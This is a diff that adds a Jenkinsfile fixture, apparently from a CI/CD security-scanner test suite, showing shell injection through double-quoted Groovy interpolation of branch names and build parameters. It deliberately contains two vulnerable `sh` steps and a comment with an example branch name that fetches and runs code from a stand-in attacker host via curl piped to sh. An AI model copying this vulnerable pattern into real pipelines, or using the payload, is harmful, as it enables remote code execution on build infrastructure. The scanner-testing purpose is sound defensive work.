@@ -1,0 +1,46 @@
+// scenarios/40-jenkins-shell-injection
+// CICD-SEC-4 (Poisoned Pipeline Execution) — Jenkins
+//
+// Pattern: a `sh` step built from a DOUBLE-QUOTED Groovy GString that
+// interpolates attacker-controlled values (the branch name, a build
+// parameter). Groovy expands `${...}` *before* the shell runs, so any
+// shell metacharacter in the value (`; | & $ > <`) becomes shell syntax —
+// arbitrary command execution on the agent. Jenkins itself calls this
+// "analogous to SQL injection." It is the Jenkins analogue of the GitHub
+// Actions expression-injection scenarios (02 / 31).
+//
+// NOTE for scanner authors: reliably distinguishing a dangerous
+// double-quoted interpolation of an *untrusted* value from a benign one
+// really wants Groovy AST analysis; plain YAML/regex matchers catch the
+// obvious double-quote shape but over- or under-fire on the margins.
+//
+// SAFETY
+// ------
+// This Jenkinsfile is a STATIC FIXTURE. Jenkins only runs a Jenkinsfile
+// that a job is explicitly configured to load; nothing in this repo
+// configures a Jenkins job, and the file is nested under scenarios/, so it
+// is inert here. Do not copy this pattern. See README.md for the exploit
+// walkthrough, expected scanner coverage, and the fix.
+
+pipeline {
+    // Constrained agent on purpose: the ONLY intended bug in this scenario
+    // is the double-quoted `sh` interpolation below, not an `agent any`
+    // executor-isolation finding.
+    agent { label 'build-linux' }
+    parameters {
+        string(name: 'DEPLOY_TARGET', defaultValue: 'staging', description: 'environment to deploy')
+    }
+    stages {
+        stage('Build') {
+            steps {
+                // DANGER — double-quoted GString interpolates the branch name
+                // directly into the shell command. A PR from a branch named
+                //   $(curl https://attacker.tld | sh)
+                // executes that command on the agent.
+                sh "echo Building branch ${env.BRANCH_NAME}"
+                // DANGER — build parameter interpolated the same unsafe way.
+                sh "./deploy.sh --target ${params.DEPLOY_TARGET}"
+            }
+        }
+    }
+}
